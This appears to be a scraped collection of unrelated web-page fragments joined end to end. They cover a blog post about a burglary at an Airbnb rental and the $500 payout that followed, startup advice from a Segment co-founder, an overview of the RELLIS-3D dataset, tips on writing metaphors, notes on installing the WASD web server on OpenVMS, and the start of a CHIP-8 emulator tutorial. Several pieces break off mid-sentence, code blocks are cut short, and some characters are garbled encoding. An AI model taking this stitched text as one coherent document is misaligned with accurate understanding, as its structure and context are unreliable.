  <li><a href="https://amzn.to/3lms9is">Sony WH1000XM3 Noise Cancelling Headphones</a> ($348)</li>
  <li><a href="https://amzn.to/3qbPNSm">Bose Quietcontrol 30 Wireless Headphones</a> ($169)</li>
  <li><a href="https://amzn.to/3fVzzIh">Bose Noise Cancelling Wireless Bluetooth Headphones 700</a> ($339)</li>
  <li><a href="https://amzn.to/37qgsSN">BlueTooth ledger</a> ($118)</li>
  <li>Two backpacks. (2 x $100)</li>
</ul>

<p><img src="https://habrastorage.org/webt/kz/an/pd/kzanpdzeno_6rkrjjgbrhbscbbs.jpeg" alt=""></p>

<p>I called the host, told her about the situation. She shared a set of images from the cameras and the next day sent the whole video.</p>

  </p>

<p>We believe this is what happened:</p>

<p>At 8:55am, two hours after we left, someone</p>
<ol>
  <li>Openly came to the front door.</li>
  <li>Knocked in the door.</li>
  <li>Waved Lexus car keys at the camera. (We do not have Lexus.)</li>
  <li>Ringed the bell.</li>
  <li>Waited to verify that no one was at home.</li>
  <li>Got to the back of the house.</li>
  <li>Put gloves and balaclava on.</li>
  <li>Checked if the back door was open. It was not.</li>
  <li>Checked if he can open the window. And it was possible.
10 Moved the pool chair below the window.</li>
  <li>Got into the house.</li>
</ol>

<p>We called the police, and in two hours an officer came. He was polite and professional. He got the list of the stolen items, our version of the incident in the written form, and left.</p>

<p>I was curious, how did the burglar open the window? I checked, and the answer was simple: <strong>the lock on the window was not operational.</strong> No need to break anything, anyone can open the window from the outside!</p>

<p>If the weather was warmer, we would probably try to open windows the night we came. In that case we would discover the problem, but the night was cold and we did not touch the windows.</p>

<p>Till this moment, I was chill. Bad things happen. Burglars get into houses, and no one could be protected from it. We were safe in this incident, and from the money perspective, our loss was not huge.</p>

<p>But the fact that the lock on that window was not functioning is an issue (few more windows had the same problem). If the front door lock was broken it would be worse but even windows that could not be locked are sketchy.</p>

<p>In general, I prefer to blame myself for bad things that happen to me. This time I cannot figure out what was my fault. For sure, we could check all the locks in the house, but it is an overkill.</p>

<p>I am ok with making mistakes and paying for them. But this time, we paid for the host’s errors and Airbnb’s as a company.</p>

<ul>
  <li><strong>Host</strong>: the house was not ready for hosting the guests.</li>
  <li><strong>Airbnb</strong>: limitations of the onboarding policy. I believe there is a list of things that the house owner needs to mark to become a host, and either functioning window locks are not on the list, or it is not enforced.</li>
</ul>

<p>After we told the host about our discovery, she sent a person to lock all the windows completely. From now on, no one would be able to open them from inside or outside.</p>



<p>I wanted to reach out to Airbnb, tell them about the situation, and ask about the next steps.</p>

<p>Safety comes first. Hence I assumed that even if you are under stress and your brain is not functioning well, it is obvious how to contact the support team.</p>

<p>To my surprise, it is not the case.</p>

<p>I spent some time on the Airbnb website but could not figure out which phone number I should call.</p>

<p><strong>Message to AirBnb</strong>: It would be great if you simplify the design of the support page. When we talk about safety, it should be about efficiency and not about the visual appeal or cuteness level.</p>

<p>I would like it to be:</p>

<ul>
  <li>I open the Airbnb website =&gt; I see an obvious button/link to the support page.</li>
  <li>I open the support page =&gt; I see an obvious button/link to the hotline phone number.</li>
</ul>

<p>I posted the tweet about the incident and tagged Airbnb and Las Vegas police in it.</p>

<blockquote>— Vladimir Iglovikov (@viglovikov) <a href="https://twitter.com/viglovikov/status/1330741490759266304?ref_src=twsrc%5Etfw">November 23, 2020</a></blockquote>


<p>A miracle happened. Airbnb contacted me and asked for my email to identify the account and to get more details.</p>

<p>My guess is that the Marketing team at Airbnb has alarms that trigger when someone mentions the company on social media.</p>

<p>Finally, after two hours, we got into the conversation about the incident, but the path to get there was not obvious at all.</p>

<p>Imagine how many people got into trouble in similar situations and did not leverage this communication channel?</p>

<p>I got an email:</p>

<blockquote>
  <p>My name is XXX, from the Airbnb claims team.</p>

  <p>I am contacting you regarding the incident that occurred during your reservation with YYY.</p>

  <p>As my colleague informed you in the previous email, we are only able to offer up to $500 for any stolen property. In order to proceed with this refund, I will need the following:</p>

  <p>*Original purchase invoice for the stolen items.</p>

  <p>This is requested as “proof of ownership”, if you don’t have the original purchase invoice, a picture of you where the item can be seen will also be accepted as proof of ownership.</p>
</blockquote>

<p>All this story is not about money. But getting compensated for the host’s and Airbnb’s mistake with cash or AirBnB credits would be nice. It does not address the issue with window locks but sweetens the situation.</p>

<p>We interpreted the email as: “We will compensate up to $500 per stolen item”. Using the numbers from the invoices, it summed to $2600.</p>

<p>We collected invoices, sent them to Airbnb, and got the reply with words: “After additional review, I’m happy to report that we have just released a payout in the amount of $500 to your Airbnb account. You can confirm in your Airbnb Transaction History.”</p>

<p>The guess about up to $500 per item was overly optimistic.</p>

<p>After the end of the stay, I got a message from the host:</p>

<blockquote>
  <p>Hi Vladimir,</p>

  <p>Thank you again for choosing our home for your vacation stay.</p>

  <p>I hope the home met (and even surpassed) your expectations. It was a sincere pleasure hosting you, and I really hope to host you again in the near future. I would be truly grateful for a 5 star review of your stay when you have a spare moment and I would definitely do the same for you.</p>

  <p>Also, please in the private comments if there is something, the home or myself can approve of please let me know.</p>
</blockquote>

<p>I understand that this is a standard template, but under the circumstances, it sounds strange and
does not fit the story and overall experience.</p>

<p>I did not plan to share the actual address of the property. The harm to the renting business could be material. But after this text, I changed my mind. It does not look like the host plans to revise the house and look for things that can and should be fixed. For example, the front door lock is barely working. The door could be open with a good push.</p>



<p>We had a great vacation. The weather was good, and the red rocks are remarkable. We had a lot of fun and plan to come back sometime soon.</p>

<p>Work laptops were replaced. We accepted the loss of personal items.</p>

<p>The Airbnb experience was not as smooth as we expected. Our things got stolen, and even on the other days, we did not feel comfortable leaving belongings in the house.</p>

<p>The host was responsive, but it is not enough. Communicating with guests and collecting money should not be the only responsibility. It is worth inspecting the house and fixing things that do not work as expected proactively, without waiting till the universe gives you feedback.</p>

<p>Overall, I believe that staying at AirBnB is safe, and such incidents are the exception rather than the rule, but, for sure, Airbnb has some work to do to improve communication and increase the guests’ safety. The compensation of $500 for all the stolen items does not look fair either.</p>

<p>I would like to end the story with some action items like: “<strong>Next time, when I rent a place, I will do XXX</strong>.” Nothing reasonable comes to my mind.</p>

<p>One option would be to do an extensive check of all locks in the building after moving in and taking all expensive belongings with me when I leave the house. I will do it in future, but it may ruin some level of fun from my future vacations.</p>

<p>What would be your action item after such an experience?</p>

            		<p>Often changes in the business side implies large changes in the corresponding code of the app to support it. Like changing business models from one-time purchase to subscription. Or that time when the business asked to provide that exclusive holiday app icon promotion for $1.99. All of these makes unit testing and integration testing of the app more challenging since in-app purchase code often interact heavily with the feature switches of corresponding products.</p>
<p>Won’t it be great if your in-app purchase code can keep working flawlessly as faced by business challenges?</p>
<p>How about having the ability to offer “<a href="https://cutecoder.org/business/time-limited-app-purchase/">exclusive limited-time availability</a>” special features as if they were physical products?</p>
<p>How to offer fully-functional <a href="https://cutecoder.org/business/free-trial-app-store/">time-limited trials</a> in Apple’s App Stores?</p>

<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks. For many of our roles at Segment, we've had to talk with 50-100 different people to make an eventual hire.</p><p><strong>If you have 24 months of runway, and a clear list of things youâ€™d do if you had more copies of yourself: you probably aren't spending time to hire the people you need.</strong></p><p>At Segment, my co-founder <a href="https://twitter.com/ivolo">Ilya</a> fulfilled this role. It was back in 2014, we were 12 people at the time, had raised a $10m Series A, and had $1m in revenue.</p><p>Thing…</p></div></div>

<h2 id="overview">Overview</h2>
<p>Semantic scene understanding is crucial for robust and safe autonomous navigation, particularly so in off-road environments. Recent deep learning advances for 3D semantic segmentation rely heavily on large sets of training data; however, existing autonomy datasets represent urban environments or lack multimodal off-road data. We fill this gap with RELLIS-3D, a multimodal dataset collected in an off-road environment containing annotations for <strong>13,556 LiDAR scans</strong> and <strong>6,235 images</strong>. The data was collected on the Rellis Campus of Texas A\&amp;M University and presents challenges to existing algorithms related to class imbalance and environmental topography. Additionally, we evaluate the current state of the art deep learning semantic segmentation models on this dataset. Experimental results show that RELLIS-3D presents challenges for algorithms designed for segmentation in urban environments. Except for the annotated data, the dataset also provides full-stack sensor data in ROS bag format, including <strong>RGB camera images</strong>, <strong>LiDAR point clouds</strong>, <strong>a pair of stereo images</strong>, <strong>high-precision GPS measurement</strong>, and <strong>IMU data</strong>. This novel dataset provides the resources needed by researchers to develop more advanced algorithms and investigate new research directions to enhance autonomous navigation in off-road environments.</p>

<p>With the goal of providing multi-modal data to enhance autonomous off-road navigation, we defined an ontology of object and terrain classes, which largely derives from <a href="http://rugd.vision/">the RUGD dataset</a> but also includes unique terrain and object classes not present in RUGD. Specifically, sequences from this dataset includes classes such as mud, man-made barriers, and rubble piles. Additionally, this dataset provides a finer-grained class structure for water sources, i.e., puddle and deep water, as these two classes present different traversability scenarios for most robotic platforms. Overall, 20 classes (including void class) are present in the data.</p>

December 5, 2020 | https://blog.streetwriters.co/how-to-write-good-metaphors/ | <a href="https://web.archive.org/web/*/https://blog.streetwriters.co/how-to-write-good-metaphors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Metaphors are everywhere;&nbsp;in literature, visual arts, poetry, and films. Language, in a way, itself&nbsp;is a metaphor. But try to make one on the fly, and you will find out it is not easy. Creating a metaphor requires ingenuity and care. A small mistake can make a metaphor clumsy. So how does one write a good metaphor?&nbsp;Let’s find out.</p><h2>Why Metaphors are Important</h2><p>Metaphors make us understand things better. When feelings are involved or when something happens which has no proper words in our vocabulary, we need something to communicate our experience. Metaphors come in handy in such situations. For example, author F. Scott Fitzgerald wanted to describe good writing. He could simply say that good writing was hard or good writing is very difficult. But he chose to say it like this:</p><p><em>All good writing is swimming underwater and holding your breath.</em></p><p>The metaphor&nbsp;“swimming underwater while holding breath” opens a door for us into the experience of Fitzgerald as a writer. That was a very difficult thing to convey in plain words. A whole paragraph might have not sufficed. But here a metaphor has conveyed the meaning completely in a single sentence. Metaphors help us convey meaning by using similarities in different objects and experiences. They relate things with one another and the result is a new understanding of a certain thing. All good poetry and literature do this to create new meanings. Another example is this beautiful metaphor by Shakespeare:</p><blockquote><p>All the world's a stage,<br>And all the men and women merely players;<br>They have their exits and their entrances;<br>And one man in his time plays many parts.</p><p><em>As You Like It</em>, William Shakespeare</p></blockquote><p>Metaphors help us use all of our senses in reading a sentence. They make the experience of language more immersive. Take this sentence as an example:</p><blockquote><p>Time has not stood still. It has washed over me, washed me away as if I'm nothing more than a woman of sand, left by a careless child too near the water.</p><p><em>The Handmaid's Tale</em>, Margaret Atwood</p></blockquote><p>The writer could simply have said that time has changed me. But the use of sand and water as metaphors has given the whole experience a life of its own. We can hear in our minds the sound of waves when reading the sentence. We can imagine a woman of sand. Therefore, metaphors give a deeper meaning to our words. They can convey meanings for which sometimes whole pages are necessary and sometimes even a book is not enough.</p><blockquote><p>I'm a little pencil in the hand of a writing God.</p><p>Mother Teresa</p></blockquote><p>In this small sentence, Mother Teresa has conveyed the whole of her faith. We can get a glimpse of her intimate relationship with God. We can sense her metaphysical experience. This was not possible without the use of a metaphor.</p><p>Along with that, plain words can be boring for our minds. Our minds hate repetitiveness and mundaneness and loves newness and ingenuity. Metaphors give us this freshness and livens ordinary language. Language becomes more interesting.</p><blockquote><p>She herself is a haunted house. She does not possess herself; her ancestors sometimes come and peer out of the windows of her eyes and that is very frightening.</p><p><em>The Bloody Chamber, </em>Angela Carter</p></blockquote><p>Simply saying that there is an eerie feeling attached to her the writer could have told us about the character but using a metaphor makes it more interesting and memorable. In addition to that, Metaphors add vagueness and abstractedness to our language. This gives readers free rein to make their own interpretations.</p><blockquote><p><em>There's a bluebird in my heart that<br></em><em>wants</em><em> to get out<br></em><em>but</em><em> I'm too tough for him,<br></em><em>I say, stay in there, I'm not going<br></em><em>to</em><em> let anybody see<br></em><em>you</em><em>.</em></p><p><em>Bluebird</em>, Charles Bukowski</p></blockquote><p>Nobody has a clear idea of what the bluebird is in this poem and so people make their interpretations. Metaphors give us the freedom to read works in the context of our own Worldview.</p><h2>How to Write Good Metaphors?</h2><p>First of all, start thinking about the thing or experience you want to express. Concentrate on the idea and think about it deeply. Understand it thoroughly. How do you feel about the whole idea?</p><p>For example, you want to describe the scene of someone waking up for the first time to the sound of the coming train. Lean into the experience of someone peacefully sleeping in a cozy room under blankets in a comfy bed. Now imagine a train passing over with an ear-shattering sound. What will the character feel like? Imagine it. Now can you compare it to something else that is similar in its sudden experience?</p><p>For me, the scene of a car suddenly breaking through the bedroom wall is similar so I would construct my metaphor around that imagery.</p><p><em>He woke up and thought a car had crashed in his bedroom. Everything was moving. His heart was pumping. "Oh! It's the train!" he let out a sigh and shook his head.</em></p><p>Secondly, try using original metaphors in your writing or ones that are rare. Commonly used metaphors are dead in a sense. Some dead metaphors are given here as an example:</p><ul><li>It's raining cats and dogs.</li><li>I'm visiting an old flame.</li><li>He's loose cannon.</li><li>She found herself behind the eight balls.</li><li>He drives me up a wall.</li><li>She saw the light at the end of the tunnel.</li><li>Ticking time bomb</li><li>Tip of the iceberg</li><li>Slippery slope</li><li>Going the extra mile</li><li>Early bird</li><li>Icy personality</li><li>Turning in one's grave</li><li>About to explode (from anger)</li></ul><p>Here are some more complex examples of metaphors. Read them carefully so you can get an idea of how a metaphor works.</p><p><em>1. Books are the mirrors of the soul.</em></p><p>Virginia Woolf describes here the connection between an author and his/her books. Books describe the inner thoughts of the author's mind. That is an experience similar to seeing one's soul. A mirror reflects everything that is in front of it. It does not lie. This small sentence combines these two concepts perfectly to convey a beautiful meaning.</p><p>2. <em>"</em><em>But soft, what light through yonder window breaks? It is the east, and Juliet is the sun!"</em></p><p>Shakespeare is trying to describe the feeling of love that Romeo had for Juliet. The sun is a classic metaphor used in ancient literature to describe a lover.</p><p>3. <em>The parents looked upon Matilda in particular as nothing more than a scab. A scab is </em><em>something you have to put up with until the time comes when you can pick it off and flick </em><em>it away.</em></p><p>The author here depicts the anger Matilda's parents felt for their child using “a scab on skin”. A person puts up with it because it's painful and messy to remove it before time.</p><p>4. <em>"O Lord, You are our Father, We are the clay, and You, our potter; And all of us are the work of Your hand."</em></p><p>In this verse of the Bible, the feeling of helplessness and the might of the All-Mighty God is described. Helplessness is compared with the inertness of the clay. And the potter's hands are the workings of God.</p><p>5. <em>Alas,</em><em> and yet what are you, my written and painted thoughts! It is not long ago that you were still so many-</em><em>coloured</em><em>, young, and malicious, so full of thorns and hidden spices you made me sneeze and laugh and now? You </em><em>have already taken off your novelty and some of you, I fear, are on the point of becoming truths: they already look so immortal, so pathetically righteous, so boring! And has it ever been otherwise? For what things do we write and paint, we mandarins with </em><em>Chinese brushes, we immortalizers of things which let themselves </em><em>be</em><em> written, what alone are we capable of painting? Alas, only that which is about to wither and is beginning to lose its fragrance! Alas, only storms departing exhausted and feelings grown old and yellow! Alas, only birds strayed and grown weary in flight </em><em>who</em><em> now let themselves be caught in the hand in our hand! We immortalize that which cannot live and fly much longer, weary and mellow things alone! And it is only your afternoon, my written and painted thoughts, for which alone I have the </em><em>colours</em><em>, many </em><em>colours</em><em> perhaps, many many-</em><em>coloured</em><em>&nbsp;</em><em>tendernesses</em><em> and fifty yellows and browns and greens and reds: but no one will divine from these how you looked in your morning, you sudden sparks and wonders of my solitude, you my old beloved wicked thoughts!</em></p><p>Here Nietzsche is describing the thoughts in the human mind which are immortal, ever-changing with infinite possibilities, and how impossible it is to define them truly words.</p><h2>Conclusion</h2><p>Good metaphors spice up any piece of art, be it a painting or a poem or a novel. Some writers use whole characters as forms of metaphors, others use symbolism. Learning to write a good metaphor can be a difference between a good piece and a great piece.

<h3><a name="openvms"></a>The OpenVMS ecosystem</h3>
<ul>
	<li>Two companies are currently supporting OpenVMS (but this is about to 
	change)<ul>
		<li>In 2014, HP transferred the rights to develop/support OpenVMS to VSI 
		(<a href="https://www.vmssoftware.com/">VMS Software Inc</a>)</li>
		<li>In 2015, HP split into two companies: HP (most desktop products) and 
		HPE (enterprise)</li>
		<li>HPE continued to support OpenVMS software contracts sold to HP customers 
		before 2015 (they also sold/supported VSI products)</li>
		<li>Early in 2019, HPE removed most OpenVMS stuff (documentation as well 
		as software) from their website including CSWS-2.2-1 (<a href="http://neilrieck.net/docs/openvms_notes_apache.html">Compaq Secure Web Services</a>) 
	based upon <span>Apache 2.0.63</span><ul>
			<li>For example, this link:
			<a href="http://h41379.www4.hpe.com/openvms/products/ips/apache/csws.html">http://h41379.www4.hpe.com/openvms/products/ips/apache/csws.html</a> 
		previously provided both software-downloads and product documentation 
		but now diverts you to this common landing page:
			<a href="https://support.hpe.com/hpsc/doc/public/display?docId=a00058693en_us">https://support.hpe.com/hpsc/doc/public/display?docId=a00058693en_us</a> 
		(in fact, all HPE OpenVMS software links now drop you here)</li>
		</ul>
		</li>
		<li>If you have an OpenVMS support contract with HPE, then you will be 
		able to request the latest version of file MOD_SSL (an Apache module for 
		CSWS) which is based upon OpenSSL-1.0L but does not implement TLSv1.3<ul>
			<li>HPE has announced the end of all OpenVMS support by the end of 2020.</li>
		</ul>
		</li>
		<li>Businesses requiring <strong>CSWS/Apache on OpenVMS</strong> should immediately 
	move their support contracts over to VSI where you will have access to a new version of CSWS 
	based upon <span>Apache 2.4.12</span><ul>
			<li><span>caveat:</span> you may be required to update your OS to OpenVMS-8.4-2 so do not wait until the last minute</li>
		</ul>
		</li>
	</ul>
	</li>
	<li>For companies and/or hobbyists financially unable to move to VMS 
	Software Inc., your the only remaining option is to replace CSWS/Apache with WASD HTTPd 
	(the high quality web server from down-under) which is not based upon 
	Apache.<ul>
		<li>WASD already supports TLSv1.2 and TLSv1.3</li>
		<li>"I think" support agreements may be available</li>
	</ul>
	</li>
	<li>This web-page will document my efforts to replace CSWS/Apache with WASD 
	HTTPd on a sacrificial laboratory system (we employ a lot of CGI including one SOAP-based 
	feed)</li>

	<li><a href="http://wasd.vsm.com.au/">WASD</a> HTTPd - is a very high quality free 
	web 
		server from <a href="http://www.vsm.com.au/">VSM Software 
	Services</a> in Australia<ul>
		<li>it runs on all VMS and OpenVMS platforms: <span>VAX, Alpha, and Itanium</span></li>
		<li>it will run on <span>x86-64</span> when VSI finally 
		publishes a OpenVMS-9 for that CPU architecture</li>
		<li>it is NOT based upon Apache</li>
		<li>it is published with all the source code so if you can program 
			in C then you can improve/extend/tinker</li>
		<li>it can link to its own SSL libraries which already support TLS-1.3, or HP-SSL (based upon 
		OpenSSL-0.9 and lower), or HP-SSL1 (OpenSSL-1.0 and higher)</li>
		<li>excerpt from page-13 of the book <strong>OpenVMS with Apache, OSU, and WASD</strong>
		<p>
				The idea with WASD was to be a really good VMS-only server: Mark Daniel says, "I 
suffered a bit of a VMS cringe when amongst my UNIX colleagues (VMS was perceived 
to be a bit slow and cumbersome), so I have also endeavored to make WASD as fast 
and efficient as I could, avoiding C run-time library and even RMS code layers 
where it was feasible and worth it. I also wanted a similarly tight scripting 
environment and have spent a lot of time honing this aspect"</p>
		</li>
		<li><span>Trivia:</span> <strong>WASD</strong> = "Wide Area 
		Surveillance Division". WASD was previously known as <strong>HFRD</strong> 
		(High Frequency Radar Division) of Australia's Defense, Science and 
		Technology Organization</li>

		<li>WASD HTTPd is published with all the source code. This means that if

<h2><a id="firststeps"></a>First Steps</h2>
<ul>
	<li>download all the zip files you think you will need from here: <a href="https://wasd.vsm.com.au/wasd/">
	https://wasd.vsm.com.au/wasd/</a> (or the various mirror sites)<ul>
		<li><span>caveat:</span> do not skip any CUP (cumulative 
		update package) files. I wasted a 
		whole day trying to get both Server Admin and SYSUAF to work (I assumed 
		I was doing something wrong). I was only successful after I noticed, 
		then installed, the CUP file (probably need new 
		eyeglasses) </li>
	</ul>
	</li>
	<li>none of these files offer executables so you will need to download a 
	vanilla package (necessary to "compile-link" or just "link") as well as the 
	architecture-specific files</li>
</ul>

<h2><a name="unzip"></a>Unzip then install</h2>
<p>Unzip</p>
<pre>$! DCL script to unzip WASD
$! this is an rx2660 (Itanium2)
$! CSWS/Apache is located on disk dka200 so that's where I'll put WASD
$!
$ define/job yada CSMIS$USER3:[ADMCSM.NEIL._WASD]	! files where downloaded here
$ set default DKA200:[000000]				! move to root of disk dka200
$ unzip yada:WASD1130.zip				! also creates folder [WASD_ROOT}
$ unzip yada:WASD1130-ia64.zip				!
$ set default [WASD_ROOT]				!
$ unzip yada:<span>WASD_CUP_1130b.ZIP</span> 			! do not forget this (or SYSUAF stuff won't work)
$ unzip yada:opensslwasd102r-ia64.zip			! optional</pre>
<p>Install (part 1) you need a DEC-C compiler to do perform step 1 so consider 
starting with step 2</p><br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody">  <p>For several reasons, emulation has always fascinated me. A program that executes other programs sounds like such a cool concept. It really feels like you’re getting your money’s worth out of writing it! Beyond that, it definitely feels like you’re <em>building</em> a computer within software. I really enjoyed learning about computer architecture and writing some basic HDL code, but emulation is a much more straightforward way of achieving a similar feeling of generating a machine. I’ve also always had this goal of knowing exactly how <em>Super Mario World</em> worked, ever since I first saw it as a kid. Because of this, writing a SNES/SFC emulator has been on my mind for a while. I decided recently that it was time to take a <a href="https://github.com/rivergillis/chip-8">step forward</a> towards making this happen.</p> <p>So let’s take a look at writing an emulator. A simple, but complete example would involve CHIP-8.</p> <p><a href="https://en.wikipedia.org/wiki/CHIP-8">CHIP-8</a> is actually a programming language. It’s really simple too, there’s only <a href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#3.0">35 opcodes</a>. To write an interpreter for it, we pretty much just need to write a program that can execute all 35 different instructions. The <em>emulation</em> aspect of this comes from the bits you wouldn’t normally find in a programming language interpreter. We need a way to display graphics, process user input, play audio, and we need to simulate the hardware mechanisms of a CHIP-8 machine. Things like registers and memory need to be taken into account during execution, and we also need to be careful about timing.</p> <p>Let’s start! For this project, we’ll be using C++. This should be fairly trivial to translate into other languages. If you want to take a look at the complete source, see the <a href="https://github.com/rivergillis/chip-8">project repository</a>.</p> <p>First, a basic main loop. We’ll ignore emulating timing for now.</p> <div><div><pre><code><span>// main.cpp</span>

    <span>return</span> <span>1</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div> <p>Our <code>CpuChip8</code> class will encapsulate the state of our virtual machine and interpreter. Now if we implement <code>RunCycle</code> and <code>Initialize</code> we’ll have ourselves a basic emulator skeleton. We now need to discuss the phsyical system we’re emulating.</p> <p>Our CHIP-8 system will be the <a href="https://en.wikipedia.org/wiki/Telmac_1800">Telmac 1800</a>. We’ve got ourselves a pool of 4K of memory, a 64x32 1-bit display, and the ability to beep. <em>Nice</em>. The CHIP-8 interpreter itself is implemented via a virtual machine. We need to keep track of a stack, sixteen 8-bit registers (named V0 through VF), a 12-bit index register (named I), a program counter, two 8-bit timers, and a 16-frame stack.</p> <p>The canonical memory map looks like this:</p> <div><div><pre><code>0x000 |--------------------|
      | Interpreter memory |
      |                    |
0x050 | Built-in fontset   |
0x200 |--------------------|
      |                    |
      |                    |
      | Program memory     |
